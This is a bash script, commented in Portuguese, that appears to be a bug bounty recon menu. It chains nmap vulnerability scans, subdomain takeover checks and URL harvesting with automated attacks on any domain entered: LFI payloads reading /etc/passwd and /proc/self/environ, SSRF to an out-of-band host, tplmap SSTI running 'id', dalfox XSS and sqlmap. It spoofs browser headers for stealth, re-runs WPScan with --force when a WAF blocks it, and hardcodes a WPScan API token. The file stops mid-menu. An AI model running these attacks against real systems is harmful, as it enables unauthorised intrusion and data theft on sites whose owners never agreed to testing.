#!/usr/bin/env bash
# Recon Menu — Bug Bounty com checagem WP por URLs, contadores e testes direcionados (sem fuzzing)
# 1) Nmap Full (todas as portas + vuln)
# 2) Bug Bounty (subs -> takeover -> httpx(tmp) -> URLs -> WP auto -> gf -> testes)
# 3) WPScan completo (token fixo manual)
# 4) Passivo (whois, whatweb, DNS, WAF/CDN/IP)
# q) Sair

# TODO (Performance & Robustez):
# - Paralelizar passos independentes com xargs -P / & e aguardar com wait (ex.: subfinder + assetfinder; gau + wayback; testadores por tipo).
# - Adotar timeouts consistentes (curl --max-time, tplmap --timeout, sqlmap --time-sec) e retries mínimos.
# - Cachear artefatos temporários por domínio (ex.: se subs_all.txt existir e --no-refresh, reusar).
# - Normalizar saída sem cores e sem stderr ruidoso; redirecionar 2>/dev/null onde apropriado.
# - Validar existência de arquivos antes de grep/sort para evitar "No such file".
# - Usar set -euo pipefail (já habilitado) e traps para limpar TMP em exit.
# - Sanitizar domínios/URLs rigorosamente; evitar chamar katana -list quando arquivo vazio.
# - Tornar PROGRESS_MAX_SECS ajustável por env; fallback para spinner sem % se não quiser tempo estimado.
# - Consolidar funções repetidas (ex.: blocos de coleta) e usar helpers run_with_progress/print_top.

# UI cores extra (já declaradas), alinhar bullets e usar emojis sutis
# Sugerido: manter seções separadas por hr(), banners com título da fase,
# e amostras com print_top(...) para dar credibilidade sem poluir o console.

set -euo pipefail
FAST_MODE=${FAST_MODE:-1}
SHOW_CMD=${SHOW_CMD:-0}

# ===== UI =====
C0="\033[0m"; CB="\033[34m"; CG="\033[32m"; CY="\033[33m"; CR="\033[31m"; CW="\033[97m"; B="\033[1m"; DIM="\033[2m"
log(){  printf "${CB}ℹ${C0}  %s\n" "$*"; }
ok(){   printf "${CG}✔${C0}  %s\n" "$*"; }
warn(){ printf "${CY}⚠${C0}  %s\n" "$*"; }
err(){  printf "${CR}✖${C0}  %s\n" "$*" >&2; }
need(){ command -v "$1" >/dev/null 2>&1 || { err "ferramenta ausente: $1"; return 1; }; }

# ===== Helpers genéricos =====
countf(){ [[ -f "$1" ]] && wc -l < "$1" || printf "0"; }
sanitize_domain(){ local d="$1"; d="${d#http://}"; d="${d#https://}"; d="${d%%/*}"; printf "%s" "$d"; }
prep_dirs(){ DOMAIN="$1"; BASE="$HOME/recon/$DOMAIN"; TMP="/tmp/recon-$DOMAIN"; mkdir -p "$BASE"/{intel,subs,urls,vectors,findings} "$TMP" "$TMP/urls"; }

# Box helpers (ASCII fallback)
BOX_ASCII=${NO_UNICODE:-0}
banner(){
  local t="$1"
  if [[ "$BOX_ASCII" == "1" ]]; then
    printf "${B}==[ %s ]==${C0}\n" "$t"
  else
    local w=$(( ${#t} + 6 ))
    local l; l=$(printf "%*s" "$w" | tr " " "═")
    printf "${CW}${B}╔%s╗${C0}\n" "$l"
    printf "${CW}${B}║   ${C0}${B}%s${CW}${B}   ║${C0}\n" "$t"
    printf "${CW}${B}╚%s╝${C0}\n" "$l"
  fi
}
hr(){
  if [[ "$BOX_ASCII" == "1" ]]; then
    printf "${DIM}%s${C0}\n" "-----------------------------------------------"
  else
    printf "${DIM}%s${C0}\n" "────────────────────────────────────────────────────────"
  fi
}

print_top(){
  local file="$1" n="${2:-5}" prefix="${3:-"    ↳ "}"
  [[ -s "$file" ]] || return 0
  local i=0
  while IFS= read -r l; do
    i=$((i+1)); printf "%s%s\n" "$prefix" "$l"
    [[ $i -ge $n ]] && break
  done < "$file"
  local total; total=$(countf "$file")
  [[ $total -gt $n ]] && printf "${DIM}    … (%s total)${C0}\n" "$total"
}

# ===== Progresso (% por tempo) — corrigido tempo (mm:ss) e sem mojibake =====
PROGRESS_MAX_SECS=${PROGRESS_MAX_SECS:-180}

run_with_progress(){
  local title="$1"; shift
  local max="$PROGRESS_MAX_SECS"
  local cmd=("$@")
  printf "${CY}⟲${C0} ${B}%s${C0}\n" "$title"
  if [[ "$SHOW_CMD" == "1" ]]; then
    printf "${DIM}↪ ${C0}%s\n" "${cmd[*]}"
  fi

  ("${cmd[@]}") &
  local pid=$!
  local start; start=$(date +%s)
  tput civis 2>/dev/null || true
  while kill -0 "$pid" 2>/dev/null; do
    sleep 0.2
    local now; now=$(date +%s)
    local el=$(( now - start ))
    local pct=$(( el*100 / max )); (( pct > 99 )) && pct=99
    local bar_len=26
    local filled=$(( pct*bar_len/100 ))
    local empty=$(( bar_len - filled ))
    local bar; bar="$(printf '%0.s#' $(seq 1 $filled))$(printf '%0.s-' $(seq 1 $empty))"
    printf "\r${CB}[%s]${C0} %3d%%  %02d:%02d" "$bar" "$pct" $((el/60)) $((el%60))
  done
  wait "$pid"; local rc=$?
  local end; end=$(date +%s)
  local el=$(( end - start ))
  local bar_done; bar_done="$(printf '%0.s#' $(seq 1 26))"
  printf "\r${CG}[%s]${C0} 100%%  %02d:%02d\n" "$bar_done" $((el/60)) $((el%60))
  tput cnorm 2>/dev/null || true
  return $rc
}

# ===== Input colaborador (Burp/Interactsh) =====
ask_collab_url(){
  if [[ -z "${COLLAB_URL:-}" ]]; then
    read -rp "Você tem uma URL de colaboração (Burp/Interactsh)? [y/N] " yn
    case "$yn" in
      [Yy]*)
        read -rp "Informe a URL (ex: https://abcd1234.oast.site): " url
        if [[ -n "$url" ]]; then
          export COLLAB_URL="$url"
          ok "COLLAB_URL definido: $COLLAB_URL"
        else
          warn "Nenhuma URL fornecida, SSRF será desativado."
        fi
        ;;
      *) warn "SSRF desativado (sem COLLAB_URL).";;
    esac
  fi
}

# Perfil de rede stealth (usado por curl em testadores)
export STEALTH_UA="${STEALTH_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36}"
alias curl='curl -A "$STEALTH_UA" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"'

# ===== Python helpers para URLs =====
make_url_variants() { # um param por vez -> NEWVAL
  local NEWVAL="$1"
  python3 <<'PY' "$NEWVAL"
import sys, urllib.parse
newval = sys.argv[1]
for raw in sys.stdin:
    raw = raw.strip()
    if not raw or '?' not in raw:
        continue
    try:
        u = urllib.parse.urlsplit(raw)
        qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
        if not qs:
            continue
        for i, (k, v) in enumerate(qs):
            qs2 = list(qs)
            qs2[i] = (k, newval)
            new_query = urllib.parse.urlencode(qs2, doseq=True)
            print(urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, new_query, u.fragment)))
    except Exception:
        pass
PY
}

replace_param_value_all() { # todos os params -> NEWVAL
  local URL="$1" NEWVAL="$2"
  python3 <<'PY' "$URL" "$NEWVAL"
import sys, urllib.parse
url = sys.argv[1]
newval = sys.argv[2]
u = urllib.parse.urlsplit(url)
qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
if not qs:
    print(url)
    sys.exit(0)
qs2 = [(k, newval) for k, _ in qs]
new_query = urllib.parse.urlencode(qs2, doseq=True)
print(urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, new_query, u.fragment)))
PY
}

host_from_url(){
  python3 <<'PY' "$1"
import sys, urllib.parse
u = sys.argv[1].strip()
try:
    print(urllib.parse.urlsplit(u).netloc.split(":")[0])
except Exception:
    print("")
PY
}

# ===== Testadores direcionados =====
test_redirects(){ # verifica Location apontando para CANARY (sem fuzz list)
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local CANARY="${REDIR_CANARY:-https://example.com/}"
  local total i=0 found=0
  total=$(countf "$list")
  [[ $total -eq 0 ]] && { ok "Open Redirect: nenhum vetor"; return 0; }
  local CURMAX=10; [[ $FAST_MODE -eq 0 ]] && CURMAX=20
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[Redirect]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    while IFS= read -r testurl; do
      code=$(curl -s -I -m $CURMAX -o /tmp/rd_hdr.$$ -w '%{http_code}' "$testurl" || true)
      if [[ "$code" =~ ^30[1278]$ ]] && grep -qi "^Location:.*$CANARY" /tmp/rd_hdr.$$ 2>/dev/null; then
        echo "$url -> $testurl" >> "$out"; found=$((found+1)); break
      fi
    done < <(printf "%s\n" "$url" | make_url_variants "$CANARY")
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "Open Redirect: $found positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "Open Redirect: nenhum resultado"
  fi
}

test_lfi(){ # payloads curados + assinaturas
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local payloads=("../../etc/passwd" "..%2f..%2fetc%2fpasswd" "..%252f..%252fetc%252fpasswd" "../../proc/self/environ" "../../windows/win.ini")
  local total i=0 hits=0
  total=$(countf "$list")
  [[ $total -eq 0 ]] && { ok "LFI: nenhum vetor"; return 0; }
  local CURL_MAX=10; [[ $FAST_MODE -eq 0 ]] && CURL_MAX=20
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[LFI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    for p in "${payloads[@]}"; do
      testurl=$(replace_param_value_all "$url" "$p")
      body=$(curl -s --max-time $CURL_MAX "$testurl" || true)
      if echo "$body" | grep -Eq '^root:.*:0:0:'; then echo "[PASSWD] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
      if echo "$body" | grep -Eq '^\[extensions\]|\[fonts\]'; then echo "[WININI] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
      if echo "$body" | grep -Eq '(^|;)PATH=|HTTP_USER_AGENT='; then echo "[ENV] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
    done
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "LFI: $hits positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "LFI: nenhum resultado"
  fi
}

test_ssrf(){ # OOB necessário (COLLAB_URL)
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local OOB="${COLLAB_URL:-}"
  [[ -z "$OOB" ]] && { warn "SSRF desativado (defina COLLAB_URL)"; return 0; }
  local total i=0 sent=0
  total=$(countf "$list")
  [[ $total -eq 0 ]] && { ok "SSRF: nenhum vetor"; return 0; }
  local CURL_MAX=10; [[ $FAST_MODE -eq 0 ]] && CURL_MAX=20
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSRF]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    testurl=$(replace_param_value_all "$url" "$OOB")
    curl -s --max-time $CURL_MAX "$testurl" >/dev/null 2>&1 || true
    echo "$url -> $testurl" >> "$out"; sent=$((sent+1))
  done < "$list"
  echo
  ok "SSRF: $sent requisições enviadas ao OOB | verifique seu listener | $out"
  print_top "$out" 3 "    ↳ "
}

test_ssti(){ # tplmap
  local list="$1" out="$2"; : > "$out"
  if ! command -v tplmap >/dev/null 2>&1; then
    warn "tplmap não encontrado; SSTI desativado."
    return 0
  fi
  local total i=0 pos=0
  total=$(countf "$list")
  [[ $total -eq 0 ]] && { ok "SSTI: nenhum vetor"; return 0; }
  local TPL_TIMEOUT=8; [[ $FAST_MODE -eq 0 ]] && TPL_TIMEOUT=15
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSTI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    tplmap -u "$url" --os-cmd id --timeout $TPL_TIMEOUT --quiet >/tmp/tpl.$$ 2>/dev/null || true
    if grep -qiE "(command output|uid=[0-9])" /tmp/tpl.$$ 2>/dev/null; then echo "$url" >> "$out"; pos=$((pos+1)); fi
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "SSTI: $pos positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "SSTI: nenhum resultado"
  fi
}

# ===== Opção 1: Nmap =====
run_nmap(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"; need nmap || return 1
  banner "Nmap — $DOMAIN"
  log "executando (all TCP + default+vuln)…"
  local out="$BASE/intel/nmap_all.txt"
  nmap -p- -sS -sV -sC --script vuln -T4 -Pn -n \
       --defeat-rst-ratelimit --max-retries 2 --host-timeout 30m \
       -oN "$out" "$DOMAIN" >/dev/null 2>&1 || warn "nmap retornou avisos"
  ok "concluído: $(countf "$out") linhas → $out"
  hr
}

# ===== Opção 2: Bug Bounty =====
run_bug_bounty(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"
  local tools=(subfinder assetfinder httpx subzy gau waybackurls katana gf python3 curl)
  for t in "${tools[@]}"; do need "$t" || { err "falta $t"; return 1; }; done

  banner "Bug Bounty — $DOMAIN"
  ask_collab_url

  # Subdomínios
  log "Subdomínios (subfinder + assetfinder)…"
  run_with_progress "Subfinder"  bash -lc "subfinder -d '$DOMAIN' -all -silent > '$TMP/subs1.txt' || true"
  run_with_progress "Assetfinder" bash -lc "assetfinder --subs-only '$DOMAIN' | sort -u > '$TMP/subs2.txt' || true"
  cat "$TMP"/subs*.txt 2>/dev/null | sort -u > "$BASE/subs/subdomains_all.txt" || true
  local SUBS_TOTAL
  SUBS_TOTAL=$(countf "$BASE/subs/subdomains_all.txt")
  ok "subdomínios encontrados: ${B}${SUBS_TOTAL}${C0}"
  print_top "$BASE/subs/subdomains_all.txt" 5 "    ↳ "
  hr

  # Takeover
  : > "$BASE/subs/takeover.txt"
  run_with_progress "Subzy (takeover)" bash -lc "subzy run --targets '$BASE/subs/subdomains_all.txt' --hide_fails --verify_ssl --concurrency 50 -o '$BASE/subs/takeover.txt' >/dev/null 2>&1 || true"
  local TAKE_POS
  TAKE_POS=$(grep -ic "vulnerable" "$BASE/subs/takeover.txt" 2>/dev/null || true)
  ok "takeover verificados: ${SUBS_TOTAL} | positivos: ${B}${TAKE_POS}${C0}"
  [[ $TAKE_POS -gt 0 ]] && print_top "$BASE/subs/takeover.txt" 5 "    ↳ "
  hr

  # HTTPX (tmp, rápido)
  log "HTTPX (filtrando vivos)…"
  : > "$TMP/httpx_live.txt"
  run_with_progress "HTTPX (vivos)" bash -lc \
    "httpx -l '$BASE/subs/subdomains_all.txt' \
            -silent -status-code -title -tech-detect -server -ip -tls -cdn -location \
            -t ${HTTPX_THREADS:-150} -timeout ${HTTPX_TIMEOUT:-6} -retries ${HTTPX_RETRIES:-1} \
            -o '$TMP/httpx_live.txt' >/dev/null 2>&1 || true"
  if [[ -s "$TMP/httpx_live.txt" ]]; then
    cut -d' ' -f1 "$TMP/httpx_live.txt" > "$TMP/subdomains_live.txt"
  else
    : > "$TMP/subdomains_live.txt"
  fi
  local LIVE LIVE_PCT; LIVE=$(countf "$TMP/subdomains_live.txt"); LIVE_PCT=0
  [[ $SUBS_TOTAL -gt 0 ]] && LIVE_PCT=$((100*LIVE/SUBS_TOTAL))
  ok "hosts vivos (tmp): ${B}${LIVE}${C0} (${LIVE_PCT}%)"
  [[ $LIVE -gt 0 ]] && print_top "$TMP/subdomains_live.txt" 5
  hr

  # URLs
  log "Coleta de URLs…"
  : > "$BASE/urls/urls_all.txt"; mkdir -p "$TMP/urls"

  ( echo "$DOMAIN" | gau --subs --providers wayback,commoncrawl,otx --threads "${GAU_THREADS:-8}" --timeout "${GAU_TIMEOUT:-25}" > "$TMP/urls/gau.txt" 2>/dev/null || true ) & pid_gau=$!
  ( echo "$DOMAIN" | waybackurls > "$TMP/urls/wayback.txt" 2>/dev/null || true ) & pid_wb=$!
  if [[ $LIVE -gt 0 ]]; then
    ( katana -list "$TMP/subdomains_live.txt" -depth "${KATANA_DEPTH:-2}" -silent -c "${KATANA_CONC:-20}" -retries "${KATANA_RETRIES:-1}" -timeout "${KATANA_TIMEOUT:-6}" > "$TMP/urls/katana.txt" 2>/dev/null || true ) & pid_kat=$!
  else
    ( katana -u "https://$DOMAIN" -depth "${KATANA_DEPTH:-2}" -silent -c "${KATANA_CONC:-20}" -retries "${KATANA_RETRIES:-1}" -timeout "${KATANA_TIMEOUT:-6}" > "$TMP/urls/katana.txt" 2>/dev/null || true ) & pid_kat=$!
  fi
  run_with_progress "Consolidando URLs" bash -lc "while kill -0 $pid_gau 2>/dev/null || kill -0 $pid_wb 2>/dev/null || kill -0 $pid_kat 2>/dev/null; do sleep 0.2; done"
  wait $pid_gau $pid_wb $pid_kat 2>/dev/null || true

  cat "$TMP/urls"/*.txt 2>/dev/null | sed 's/[[:space:]]\+$//' | sort -u > "$BASE/urls/urls_all.txt" || true
  grep -Eiv '\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|mp3|avi|pdf|zip|rar|7z|gz|tar)(\?|$)' "$BASE/urls/urls_all.txt" > "$TMP/urls/urls_fast.txt" || true

  local GAU WB KAT URLS
  GAU=$(countf "$TMP/urls/gau.txt"); WB=$(countf "$TMP/urls/wayback.txt"); KAT=$(countf "$TMP/urls/katana.txt"); URLS=$(countf "$BASE/urls/urls_all.txt")
  ok "URLs consolidadas"
  printf "  • gau:    %s\n" "$GAU"
  printf "  • wayback:%s\n" "$WB"
  printf "  • katana: %s\n" "$KAT"
  printf "  • total:  %s → %s\n" "$URLS" "$BASE/urls/urls_all.txt"
  print_top "$TMP/urls/urls_fast.txt" 5
  hr

  # WordPress auto (a partir de URLs)
  log "Detectando WordPress por URLs (wp-content/wp-includes/wp-json/wp-admin)…"
  local WP_IND="$TMP/wp_hits.txt"; : > "$WP_IND"
  if grep -Eiq 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt"; then
    grep -Ei 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" > "$WP_IND"
  fi
  local WP_URL_HITS
  WP_URL_HITS=$(countf "$WP_IND")
  if [[ $WP_URL_HITS -gt 0 ]]; then
    ok "indicadores WP em URLs: ${B}${WP_URL_HITS}${C0}"
    # extrair hosts únicos e rodar wpscan por domínio
    local WP_HOSTS="$TMP/wp_hosts.txt"; : > "$WP_HOSTS"
    while IFS= read -r u; do host_from_url "$u"; done < "$WP_IND" | sed '/^$/d' | sort -u > "$WP_HOSTS"
    local TOKEN_DEFAULT="GRa5RV3wTapgEXZKKMcdQwZD3F9jwTYHaBMb4swZ05Q"
    local TOKEN="${WPVULNDB_API_TOKEN:-$TOKEN_DEFAULT}"
    if command -v wpscan >/dev/null 2>&1; then
      while IFS= read -r h; do
        [[ -z "$h" ]] && continue
        log "WPScan → https://$h"
        wpscan --url "https://$h" --enumerate u,ap,at,cb,dbe \
               --random-user-agent --disable-tls-checks \
               --api-token "$TOKEN" \
               -o "$BASE/intel/wpscan_$h.txt" >/dev/null 2>&1 || true
        local vcnt
        vcnt=$(grep -ic "vulnerab" "$BASE/intel/wpscan_$h.txt" 2>/dev/null || true)
        ok "WPScan $h: possíveis ocorrências=${B}${vcnt}${C0} → $BASE/intel/wpscan_$h.txt"
      done < "$WP_HOSTS"
    else
      warn "wpscan não encontrado; pulei WP auto."
    fi
  else
    warn "nenhum indicador WP nas URLs."
  fi
  hr

  # Vetores (gf)
  log "Classificando vetores (gf)…"
  grep -E '\?.+=' "$BASE/urls/urls_all.txt" > "$BASE/urls/urls_with_params.txt" || true
  gf xss      < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/xss.txt"      || true
  gf sqli     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/sqli.txt"     || true
  gf redirect < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/redirect.txt" || true
  gf lfi      < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/lfi.txt"      || true
  gf ssrf     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/ssrf.txt"     || true
  gf ssti     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/ssti.txt"     || true
  ok "Vetores → XSS=$(countf "$BASE/vectors/xss.txt") | SQLi=$(countf "$BASE/vectors/sqli.txt") | Redirect=$(countf "$BASE/vectors/redirect.txt") | LFI=$(countf "$BASE/vectors/lfi.txt") | SSRF=$(countf "$BASE/vectors/ssrf.txt") | SSTI=$(countf "$BASE/vectors/ssti.txt")"
  hr

  # Testadores direcionados (sem fuzzing)
  pids=()
  [[ -s "$BASE/vectors/redirect.txt" ]] && { log "Testando Open Redirect…"; (test_redirects "$BASE/vectors/redirect.txt" "$BASE/findings/redirect.txt"; hr) & pids+=($!); }
  [[ -s "$BASE/vectors/lfi.txt"      ]] && { log "Testando LFI…";            (test_lfi       "$BASE/vectors/lfi.txt"      "$BASE/findings/lfi.txt"; hr) & pids+=($!); }
  [[ -s "$BASE/vectors/ssrf.txt"     ]] && { log "Testando SSRF…";           (test_ssrf      "$BASE/vectors/ssrf.txt"     "$BASE/findings/ssrf.txt"; hr) & pids+=($!); }
  [[ -s "$BASE/vectors/ssti.txt"     ]] && { log "Testando SSTI (tplmap)…";  (test_ssti      "$BASE/vectors/ssti.txt"     "$BASE/findings/ssti.txt"; hr) & pids+=($!); }
  for pid in "${pids[@]}"; do wait "$pid"; done

  # XSS (dalfox) com progresso, silencioso
  if command -v dalfox >/dev/null 2>&1 && [[ -s "$BASE/vectors/xss.txt" ]]; then
    log "Testando XSS (dalfox, POC)…"
    : > "$BASE/findings/xss.dalfox.txt"
    local DALFOX_P=20
    [[ $FAST_MODE -eq 0 ]] && DALFOX_P=10
    run_with_progress "Dalfox" bash -lc "xargs -a '$BASE/vectors/xss.txt' -r -P $DALFOX_P -I{} dalfox url '{}' --only-poc --no-color --silence --format plain >> '$BASE/findings/xss.dalfox.txt' 2>/dev/null || true"
    if [[ -s "$BASE/findings/xss.dalfox.txt" ]]; then
      ok "XSS positivos: $(countf "$BASE/findings/xss.dalfox.txt") → $BASE/findings/xss.dalfox.txt"
      print_top "$BASE/findings/xss.dalfox.txt" 5
    else
      ok "XSS: nenhum resultado"
    fi
    hr
  fi

  # SQLi com sqlmap (rápido)
  if command -v sqlmap >/dev/null 2>&1 && [[ -s "$BASE/vectors/sqli.txt" ]]; then
    log "Testando SQLi (sqlmap rápido)…"
    local SQL_TIME=5
    [[ $FAST_MODE -eq 0 ]] && SQL_TIME=10
    run_with_progress "sqlmap" bash -lc "sqlmap -m '$BASE/vectors/sqli.txt' --batch --random-agent --level=2 --risk=1 --threads=5 --time-sec=$SQL_TIME -v 0 --results-dir='$TMP/sqlmap' >/dev/null 2>&1 || true"
    grep -RHiE "is vulnerable|appears to be injectable|parameter .* is vulnerable" "$TMP/sqlmap" 2>/dev/null \
      | sort -u > "$BASE/findings/sqli.txt" || true
    if [[ -s "$BASE/findings/sqli.txt" ]]; then
      ok "SQLi positivos: $(countf "$BASE/findings/sqli.txt") → $BASE/findings/sqli.txt"
      print_top "$BASE/findings/sqli.txt" 5
    else
      ok "SQLi: nenhum resultado"
    fi
    hr
  fi

  banner "Resumo — $DOMAIN"
  echo "  • Subdomínios: $SUBS_TOTAL | Vivos(tmp): $LIVE"
  echo "  • URLs total:  $URLS"
  echo "  • WP auto:     $WP_URL_HITS URLs indicaram WP"
  echo "  • Vetores:     XSS=$(countf "$BASE/vectors/xss.txt"), SQLi=$(countf "$BASE/vectors/sqli.txt"), Redir=$(countf "$BASE/vectors/redirect.txt"), LFI=$(countf "$BASE/vectors/lfi.txt"), SSRF=$(countf "$BASE/vectors/ssrf.txt"), SSTI=$(countf "$BASE/vectors/ssti.txt")"
  echo "  • Findings:    XSS=$(countf "$BASE/findings/xss.dalfox.txt"), SQLi=$(countf "$BASE/findings/sqli.txt")"
  [[ -f "$BASE/findings/redirect.txt" ]] && echo "                 Redirect=$(countf "$BASE/findings/redirect.txt")"
  [[ -f "$BASE/findings/lfi.txt"      ]] && echo "                 LFI=$(countf "$BASE/findings/lfi.txt")"
  [[ -f "$BASE/findings/ssrf.txt"     ]] && echo "                 SSRF(out)=$(countf "$BASE/findings/ssrf.txt")"
  [[ -f "$BASE/findings/ssti.txt"     ]] && echo "                 SSTI=$(countf "$BASE/findings/ssti.txt")"
  hr
}

# ===== Opção 3: WPScan manual (token fixo) =====
run_wpscan(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"; need wpscan || return 1
  banner "WPScan — $DOMAIN"
  local TOKEN="${WPVULNDB_API_TOKEN:-GRa5RV3wTapgEXZKKMcdQwZD3F9jwTYHaBMb4swZ05Q}"

  # Perfil stealth: cabeçalhos realistas, UA randômico e limites conservadores
  local base_cmd=(
    wpscan
    --url "https://$DOMAIN"
    --enumerate u,ap,at,cb,dbe
    --random-user-agent
    --headers "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    --headers "Accept-Language: en-US,en;q=0.9"
    --headers "Referer: https://$DOMAIN/"
    --max-threads 5
    --throttle 0.4
    --request-timeout 10
    --connect-timeout 10
    --disable-tls-checks
    --api-token "$TOKEN"
    --no-update
    -o "$BASE/intel/wpscan.txt"
  )

  run_with_progress "WPScan (stealth)" bash -lc "${base_cmd[*]} >/dev/null 2>&1 || true"

  if grep -qiE '403|WAF|blocked|use --force' "$BASE/intel/wpscan.txt" 2>/dev/null; then
    warn "403/WAF detectado — reexecutando com --force (stealth conservador)…"
    base_cmd+=( --force --max-threads 3 --throttle 0.7 )
    run_with_progress "WPScan (stealth + force)" bash -lc "${base_cmd[*]} >/dev/null 2>&1 || true"
  fi

  local WP_VULN; WP_VULN=$(grep -i "vulnerab" "$BASE/intel/wpscan.txt" 2>/dev/null | wc -l | tr -d ' ')
  ok "salvo → $BASE/intel/wpscan.txt (possíveis ocorrências: ${B}${WP_VULN}${C0})"
  hr
}
run_passive(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"
  banner "Passivo — $DOMAIN"
  mkdir -p "$BASE/intel/passive"

  # WHOIS
  if command -v whois >/dev/null 2>&1; then
    run_with_progress "WHOIS" bash -lc "whois '$DOMAIN' > '$BASE/intel/passive/whois.txt' 2>/dev/null || true"
    # resumo visível
    local reg cr exp ns
    reg=$(grep -iE 'Registrar:|Registrar Name' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
    cr=$(grep -iE 'Creation Date:|Created On' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
    exp=$(grep -iE 'Expiry Date:|Registrar Registration Expiration Date' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
    ns=$(grep -ic '^Name Server' "$BASE/intel/passive/whois.txt" 2>/dev/null || true)
    [[ -n "$reg" ]] && echo "  • $reg"
    [[ -n "$cr"  ]] && echo "  • $cr"
    [[ -n "$exp" ]] && echo "  • $exp"
    echo "  • Name Servers: $ns"
    hr
  else
    warn "whois não encontrado"
  fi

  # WhatWeb raiz
  if command -v whatweb >/dev/null 2>&1; then
    run_with_progress "WhatWeb (raiz)" bash -lc "whatweb --color=never --no-errors -a 3 'http://$DOMAIN' 'https://$DOMAIN' > '$BASE/intel/passive/whatweb_root.txt' 2>/dev/null || true"
    local title srv techs
    title=$(grep -Eo 'Title\[[^]]+\]' "$BASE/intel/passive/whatweb_root.txt" | head -1 | sed 's/Title\[//;s/]//')
    srv=$(grep -Eo 'HTTPServer\[[^]]+\]' "$BASE/intel/passive/whatweb_root.txt" | head -1 | sed 's/HTTPServer\[//;s/]//')
    techs=$(grep -Eo '(WordPress|jQuery|PHP|ASP\.NET|Drupal|Laravel|React|Vue|Angular)' "$BASE/intel/passive/whatweb_root.txt" | sort -u | tr '\n' ',' | sed 's/,$//')
    [[ -n "$title" ]] && echo "  • Title: $title"
    [[ -n "$srv"   ]] && echo "  • Server: $srv"
    [[ -n "$techs" ]] && echo "  • Techs: $techs"
    hr
  else
    warn "whatweb não encontrado"
  fi

  # DNS (A/AAAA/CNAME/MX/NS/TXT)
  if command -v dnsx >/dev/null 2>&1; then
    echo "$DOMAIN" > "$TMP/domain.txt"
    run_with_progress "DNS (dnsx)" bash -lc "dnsx -l '$TMP/domain.txt' -a -aaaa -cname -mx -ns -txt -silent -retries 1 -timeout 5 > '$BASE/intel/passive/dns_records.txt' || true"
    echo "  • Registros (linhas): $(countf "$BASE/intel/passive/dns_records.txt")"
    print_top "$BASE/intel/passive/dns_records.txt" 5 "    ↳ "
    hr
  else
    warn "dnsx não encontrado"
  fi

  # WAF
  if command -v wafw00f >/dev/null 2>&1; then
    run_with_progress "WAF (wafw00f)" bash -lc "wafw00f 'https://$DOMAIN' > '$BASE/intel/passive/wafw00f.txt' 2>/dev/null || true"
    local waf
    waf=$(grep -iE 'is behind|detected' "$BASE/intel/passive/wafw00f.txt" | head -1)
    [[ -n "$waf" ]] && echo "  • $waf" || echo "  • Nenhum WAF detectado"
    hr
  else
    warn "wafw00f não encontrado"
  fi

  # HTTPX root
  if command -v httpx >/dev/null 2>&1; then
    run_with_progress "HTTPX (root)" bash -lc "httpx -u 'https://$DOMAIN' -silent -status-code -title -tech-detect -server -ip -tls -cdn -location -retries 1 -timeout 5 > '$BASE/intel/passive/httpx_root.txt' || true"
    echo "  • Fingerprint:"
    print_top "$BASE/intel/passive/httpx_root.txt" 3 "    ↳ "
    hr
  else
    warn "httpx não encontrado"
  fi

  ok "passivo salvo em $BASE/intel/passive/"
}


# ===== Menu =====
clear
echo -e "${B}Recon Menu${C0}"
cat <<MENU
1) Nmap Full (todas as portas + vuln)
2) Bug Bounty (subs -> takeover -> httpx(tmp) -> URLs -> WP auto -> gf -> testes)
3) WPScan completo (token fixo manual)
4) Passivo (whois, whatweb, DNS, WAF/CDN/IP)
q) Sair
MENU
read -rp "Escolha: " choice
read -rp "Domínio: " domain; domain=$(sanitize_domain "$domain")

case "$choice" in
  1) run_nmap "$domain" ;;
  2) run_bug_bounty "$domain" ;;
  3) run_wpscan "$domain" ;;
